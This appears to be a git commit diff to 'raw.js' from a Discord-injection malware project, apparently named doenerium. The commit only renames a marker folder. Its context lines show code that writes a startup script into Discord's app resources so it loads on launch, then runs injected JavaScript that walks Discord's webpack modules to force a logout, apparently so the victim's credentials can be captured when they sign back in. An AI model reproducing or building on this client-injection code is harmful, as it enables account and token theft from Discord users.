13563d0d1b9616181678482e8afb5e26a5a8d644
Carbonv1 <108577441+Carbonv1@users.noreply.github.com>
2022-07-03 14:25:56 +0200

    Update raw.js

--- raw.js
+++ raw.js
@@ -457,8 +457,8 @@ require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
     fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
   }
-  if (!fs.existsSync(path.join(__dirname, 'doenerium'))) return !0;
-  fs.rmdirSync(path.join(__dirname, 'doenerium'));
+  if (!fs.existsSync(path.join(__dirname, 'doenerium_on_top'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'doenerium_on_top'));
   execScript(
     `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
   );
